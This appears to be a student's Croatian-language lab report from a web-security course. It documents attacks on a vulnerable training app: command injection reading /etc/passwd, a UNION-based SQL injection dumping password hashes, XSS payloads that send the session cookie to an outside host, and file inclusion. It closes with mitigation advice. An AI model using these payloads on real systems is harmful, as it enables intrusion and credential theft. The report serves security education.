@@ -1,0 +1,68 @@
+1. zadatak
+Nakon isprobavanja kako rade naredbe u bashu, isprobao sam naredbu "1 | cat /etc/passwd".
+Unosom te naredbio ispisao se sljedeći tekst:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+Postupak se vidi na slici zad1-1.png
+
+2. zadatak
+Nakon što sam isprobavao ulaze s raznim id, koristeći hint iz uputa (union) i već poznavajući izgled baze podataka zbog uputa te pomoću primjere iz prezentacije stvorio sam upit koji je napokon radio.
+Uput je: "' OR 1 = 1 UNION SELECT user, password FROM users WHERE '1' = '1"
+Postupak toga se može vidjeti na slici zad2-1.png.
+Nakon toga koristio sam crackstation.net za dobivanje lozinke iz hasha.
+Postupak toga se može vidjeti na slici zad2-2.png.
+Dobivena lozinka je: "letmein".
+
+3. zadatak
+Koristeći upute sa hinta i informacije s prezentacije isprobavao sam funkcionalnosti XSS-a.
+Prvo sam testirao ispravno sintaksu za slanje koda tako što sam napravio test s alert() metodom.
+Primjer toga se vidi na slikama: zad3-1.png i zad3-2.png.
+
+Zatim sam pomoću uputa iz prezentacije izvadio session cookie.
+Unos tih naredbi vidi se na slikama: zad3-3.png i zad3-4.png
+Session cookie je: "PHPSESSID=o1qjfhisiednb2o3la8e5iulp2; security=low"
+
+Nakon toga htio sam napraviti sljanje cookija na danu stranicu fer.hr no ostao sam bez znakova za unos.
+Kako je granica znakova kodirana na na samom html elementu ulaženjem u "inspect element" način izmjenio sam inicijalnu granicu od 50 znakova.
+Postupak i razlika u dozvoljenov dužini tekst može se vidjeti na slikama: zad3-5.png i zad3-6.png.
+
+Zatim sam prekopirajući naredbu iz uputa sa vlastitim dobivenim vrijednostima cookieja napravio XSS napad.
+Postupak se može vidjeti na slikama: zad3-6.png i zad3-7.png
+Poslani upit je sljedeći:
+<script> document.location.href='http://public.tel.fer.hr/srs?cookie=security=low;%20PHPSESSID=o1qjfhisiednb2o3la8e5iulp2';</script>
+
+Zatim je isto trebalo napraviti ali na reflected XSS
+Isti postupak se možve vidjeti na slikama: zad3-8.png, zad3-9.png, zad3-10.png i zad3-11.png
+Poslani upit je sljedeći:
+<script>document.location.href='http://public.tel.fer.hr/srs?cookie=security=low;%20PHPSESSID=o1qjfhisiednb2o3la8e5iulp2'</script>
+
+4. zadatak
+Pročitajući upute zadatka i izmjenjujući ponuđene 3 stranice primjetio sam da se u stranicu učitava datoteka čiji je put dan preko parametra page.
+Mjesto tog parametra možemo vidjeti na slici zad4-1.png.
+Zadajući put do /etc/passwd u adresu preglednika aplikacija je učitala podatke iz tog dokumenta i prikazala ih na web stranici.
+Sadržaj tog dokumenta vidi se na slici zad4-2.png.
+
+Od ovakve vrte napada zaštitio bi se pravima.
+Korisnik koji pokreće aplikaciju imao bi prava pristupa samo datotekama unutar direktorija aplikacije.
+Još bih dodatno ograničio pristup datotekama unutar tog direkotrija na samo one koje su potrebne za normalan rad aplikacije.
+Naravno prije svega ovoga potrebno je na serverskoj strani provjeriti format parametara koje je korisnik unjeo.
